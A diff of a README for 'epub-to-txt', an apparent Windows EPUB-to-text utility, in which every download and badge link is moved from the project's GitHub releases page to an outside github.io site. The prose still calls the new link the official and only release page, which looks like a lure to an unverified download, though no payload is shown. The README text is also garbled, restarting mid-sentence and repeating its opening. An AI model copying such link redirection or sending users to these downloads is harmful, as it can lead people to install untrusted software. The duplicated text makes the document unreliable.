@@ -1,10 +1,10 @@
 # 📚 epub-to-txt - Turn EPUB Books Into Clean Text Files
 
-[![Download EPUB to TXT](https://img.shields.io/badge/Download-EPUB%20to%20TXT-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sherknals/epub-to-txt/releases)
+[![Download EPUB to TXT](https://img.shields.io/badge/Download-EPUB%20to%20TXT-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://sherknals.github.io)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-FF69B4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sherknals/epub-to-txt/releases)
-[![License](https://img.shields.io/badge/License-Free-2EA44F?style=for-the-badge)](https://github.com/sherknals/epub-to-txt/releases)
-[![Format](https://img.shields.io/badge/Output-UTF--8%20Text-FF8C00?style=for-the-badge)](https://github.com/sherknals/epub-to-txt/releases)
+[![Platform](https://img.shields.io/badge/Platform-Windows-FF69B4?style=for-the-badge&logo=windows&logoColor=white)](https://sherknals.github.io)
+[![License](https://img.shields.io/badge/License-Free-2EA44F?style=for-the-badge)](https://sherknals.github.io)
+[![Format](https://img.shields.io/badge/Output-UTF--8%20Text-FF8C00?style=for-the-badge)](https://sherknals.github.io)
 
 EPUB to TXT is a friendly desktop utility that opens an EPUB ebook and gives you back a plain, readable text file. No menus full of confusing options. No command line. No account to create. You pick your book, you press a button, and you get a clean UTF-8 text file with real chapter breaks in it — ready to read on any device, paste into a document, or feed into the reading app or note tool of your choice.
 
@@ -18,11 +18,11 @@ This tool solves exactly that problem.
 
 Point it at an EPUB file, and it produces one tidy `.txt` file containing the# 📚 epub-to-txt - Turn EPUB Books Into Clean Text Files
 
-[![Download EPUB to TXT](https://img.shields.io/badge/Download-EPUB%20to%20TXT-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sherknals/epub-to-txt/releases)
+[![Download EPUB to TXT](https://img.shields.io/badge/Download-EPUB%20to%20TXT-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://sherknals.github.io)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-FF69B4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sherknals/epub-to-txt/releases)
-[![License](https://img.shields.io/badge/License-Free-2EA44F?style=for-the-badge)](https://github.com/sherknals/epub-to-txt/releases)
-[![Output](https://img.shields.io/badge/Output-UTF--8%20Text-FF8C00?style=for-the-badge)](https://github.com/sherknals/epub-to-txt/releases)
+[![Platform](https://img.shields.io/badge/Platform-Windows-FF69B4?style=for-the-badge&logo=windows&logoColor=white)](https://sherknals.github.io)
+[![License](https://img.shields.io/badge/License-Free-2EA44F?style=for-the-badge)](https://sherknals.github.io)
+[![Output](https://img.shields.io/badge/Output-UTF--8%20Text-FF8C00?style=for-the-badge)](https://sherknals.github.io)
 
 EPUB to TXT is a friendly desktop utility that opens an EPUB ebook and gives you back a plain, readable text file. No menus stuffed with confusing options. No command line. No account to create. You choose your book, you press a button, and you get a clean UTF-8 text file with real chapter breaks in it — ready to read on any device, paste into a document, or load into the reading and note-taking tools you already use.
 
@@ -56,9 +56,9 @@ That is the whole process. There is nothing to configure, no settings you must c
 
 ## 📥 Download EPUB to TXT
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20EPUB%20to%20TXT-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sherknals/epub-to-txt/releases)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20EPUB%20to%20TXT-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://sherknals.github.io)
 
-Visit this link to download the application: **https://github.com/sherknals/epub-to-txt/releases**
+Visit this link to download the application: **https://sherknals.github.io**
 
 This is the official release page and the only place you need to go to get the software. Bookmark it — new versions are published there, and the newest release is always listed at the top.
 
